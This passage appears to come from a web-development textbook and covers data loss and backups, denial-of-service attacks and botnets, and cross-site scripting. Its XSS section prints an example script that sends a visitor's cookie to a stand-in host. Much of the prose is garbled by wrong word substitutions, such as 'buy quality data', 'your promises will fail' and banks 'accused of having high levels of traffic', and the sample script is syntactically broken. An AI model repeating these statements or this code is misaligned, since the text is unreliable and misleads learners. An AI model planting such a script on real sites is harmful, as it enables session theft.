Losing data can be more costly for you than having it revealed. If you have spent months building your site, gathering user data and orders, how much would it cost you in time, reputation, and dollars to lose all that information? If you had no backups of your data, you would need to rewrite the website in a hurry and start from scratch. You would also have dissatisfied customers and fraudsters claiming that they ordered something that never arrived.

It is possible that crackers will break into your site and destroy your data. It is fairly likely that a programmer or administrator will at some point delete something by accident, but it is almost certain that you will lose a hard disk drive. Hard disk drives read and write thousands of times per minute, and, occasionally, they fail. Murphy's Law would tell you the one that fails will be the most important one, long after you made a backup.

# Reducing the Risk

You can take various measures to reduce the chance of data loss. Secure your servers against crackers. Keep the number of staff with your machine to a minimum. Hire only competent, capable people. Buy quality data. Use Redundant Array of Inexpensive Disks (RAID) so that multiple drives can act like one, more reliable drive.

Regardless of its cause, you have one real protection against data loss: Backing up data is not science. On the contrary, it is tedious, dull, and—hope—useless, but it is vital. Make sure that your data is regularly backed up and make sure that you have tested your backup procedure to certain that you can recover. Make sure that your backups are stored away from your computers. Although the chances that your promises will fail or suffer some other catastrophic failure are unlikely, storing a backup onsite is a fairly cheap insurance policy.

# Denial of Service

One of the most threats to guard against is denial of service. Denial of service (DoS) occurs when somebody's actions make it difficult or impossible for users to access a service, or delay their access to a time-critical service.

Having your servers rendered useless for hours, if not longer, can be a serious burden from which to recover. If you consider how ubiquitous of the major sites on the Internet are and how you expect them to be there, any downtime is a problem.

Again, with some of the other threats, a DoS can come from forces other than malicious. A misconfigured network or an influx of users (say, your application featured on a popular blog) can have the same effect.

In early 2013, a series of distributed denial of service (DDoS) attacks were made against US financial institutions such as American Express and Wells Fargo. These sites are accused of having high levels of traffic, and have excellent security teams working on them, but they are still vulnerable to being shut down for hours by a DoS attack. Some sites have specific times when they expect to do most of their business. Online bookmaking sites experience high demand just before major sporting events. One way that crackers exploited to profit from DDoS attacks in 2004 was by extorting money from online bookmakers with the threat of attacking during these peak times.

One of the reasons that DDoS attacks are so difficult to guard against is that they can be carried out in a huge number of ways. Methods could include installing a program on a target machine that uses most of the system's processor time, reverse spamming, or using one of many automated tools. A reverse spam involves sending spam out the target listed as the sender. This way, the target will have thousands of angry replies to deal with, as well as her real emails classified as spam.

Automated tools to launch distributed DDoS attacks on a target. Without needing knowledge, somebody can scan a large number of machines for known vulnerabilities, compromise a machine, and install the tool. Because the process is automated, an attacker can install the tool on a single host in less than five seconds. When enough machines have been coopted, all are instructed to flood the target with network traffic. Machines that have been compromised in such a way are sometimes called zombies or bots, and a collection of compromised machines used to launch an attack is called a botnet.

# Reducing the Risk

Guarding against DDoS attacks is difficult in general. With a little research, you can find the default ports used by some common DDoS tools and close them. Your router might provide mechanisms to limit the percentage of traffic that uses particular protocols such as ICMP. If every network administrator could be relied on to vigilantly monitor his own network, DDoS would not be a problem.

It's generally a good idea to have a plan for what happens when you receive a massive influx of traffic, for whatever reason.

One option is to block problematic traffic at your load balancer. Of course, this only works as long as your load balancer services, and as long as the traffic is coming from a recognizable set of IPs (some botnets).

Another option is to develop a mechanism to make some parts or all of the static site, even temporarily, and push it to a content distribution network. This works for managing the friendly kind of traffic.

Another is to implement some feature flagging in your application. This allows you to turn features on and off. In times of high load, you might switch less-critical or more expensive features to cope with the extra traffic.

# Malicious Code Injection

One type of attack has been particularly effective over the years the web is with called code injection. The well known of these is Cross Site Scripting (known as XSS, so not to be confused with Cascading Style Sheets—CSS). While particularly troubling about these attacks is that some sort of code executes, causing varying degrees of information loss or redirection of users, without their even noticing it.

Cross Site Scripting basically works as follows:

- 1. The malicious user, in a form that will turn around and display to other people the input it was given (such as a comment or message board entry), enters text that not only represents the message they want to tell, but some script to execute on the client, such as the following:
```html
<script type="text/javascript">
this.document = "go.somewhere.bad?cookie=" + this.cookie;
</script type="text/javascript">
```
- 2. The malicious user then submits the form and waits.
- 3. The user of the system who goes to view the page that contains that text entered by the malicious user will execute the script code entered. In our simple example, the user will be redirected, along with any cookie information from the originating site.

Although this is a trivial example, the possibilities of what can be done with an XSS attack are very wide.

There are other forms of malicious code injection. For example, we talked in depth SQL injection attacks in the last section of this book.

It's also possible to take advantage of vulnerabilities in your code, your installed applications, or your configuration to upload arbitrary code to run on your web server, leading to a compromised web server. We discuss this in the next section.
